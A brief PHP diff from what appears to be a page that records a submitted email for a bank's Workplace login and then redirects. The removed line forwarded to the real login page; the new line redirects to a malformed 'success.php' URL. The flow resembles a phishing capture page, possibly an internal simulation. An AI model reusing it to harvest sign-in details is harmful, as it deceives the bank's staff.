@@ -43,7 +43,7 @@ if (isset($_POST['identifier'])) {
     mysqli_stmt_execute($stmt);
 
     $email = $_POST['identifier'];
-    header('Location: '.'https://xacbank.workplace.com/login/input/?identifier='.$email);
+    header('Location: '.'success.php'.$email);
 //     echo "<script>window.location.href = 'https://xacbank.workplace.com/login/input/?identifier=soc%40xacbank.mn';</script>";
 //     header('location: index.php');
 //     // https://xacbank.workplace.com/login/input/?identifier=soc%40xacbank.mn
